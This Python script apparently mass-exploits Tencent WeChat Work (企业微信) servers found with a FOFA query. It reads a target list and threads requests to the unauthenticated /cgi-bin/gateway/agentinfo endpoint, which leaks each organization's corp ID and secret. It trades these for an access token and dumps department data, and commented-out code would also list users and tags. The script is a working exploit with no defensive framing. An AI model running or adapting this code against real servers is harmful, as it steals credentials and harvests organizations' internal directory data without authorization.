import requests,threading,os,urllib3
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: app="Tencent-企业微信" 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:
        url = ip_+'/cgi-bin/gateway/agentinfo'
        
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if len(res.text)==0 or res.status_code==404 or 'strcorpid' not in res.text:
            return
        # print(f'{res} {len(res.text)} \n{index} {ip_}\n {res.text}\n')
        strcorpid=res.json()['strcorpid']
        secret=res.json()['Secret']
        # print(strcorpid,secret)
        get_url=ip_+f'/cgi-bin/gettoken?corpid={strcorpid}&corpsecret={secret}'
        get_res=requests.get(get_url, headers=headers, timeout=8, verify=False)
        access_token=get_res.json()['access_token']
        # print(access_token)
    

        # get_user_url=ip_+f'/cgi-bin/user/list_id?access_token={access_token}&limit=0'
        get_user_url=ip_+f'/cgi-bin/user/list?access_token={access_token}&department_id=8'

        payload={
            # "cursor": "xxxxxxx",
            "limit": 10
        }
        # get_user_res=requests.post(get_user_url, headers=headers, timeout=8, verify=False)
        # userlist=get_user_res.json()['userlist']
        # if len(userlist)==0:
        #     return
        # print(ip_)
        # print(len(userlist),userlist)

        get_department_id_url=ip_+f'/cgi-bin/department/list?access_token={access_token}'
        get_department_id_res=requests.get(get_department_id_url, headers=headers, timeout=8, verify=False)
        department=get_department_id_res.json()['department']
        if len(department)==0:
            return
        print(ip_)
        print(len(department),department)
        # get_single_department_url=ip_+f'/cgi-bin/department/get?access_token={access_token}&id=2'
        # get_single_department_res=requests.get(get_single_department_url, headers=headers, timeout=8, verify=False)
        # print(get_single_department_res.status_code,get_single_department_res.json())

        # get_tag_url=ip_+f'/cgi-bin/tag/list?access_token={access_token}'
        # get_tag_res=requests.get(get_tag_url, headers=headers, timeout=8, verify=False)
        # print(get_tag_res.status_code,get_tag_res.text)

        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
# with open(r'D:\Downloads\tmp\wechat.txt', 'r') as file:
with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+42

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'

if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()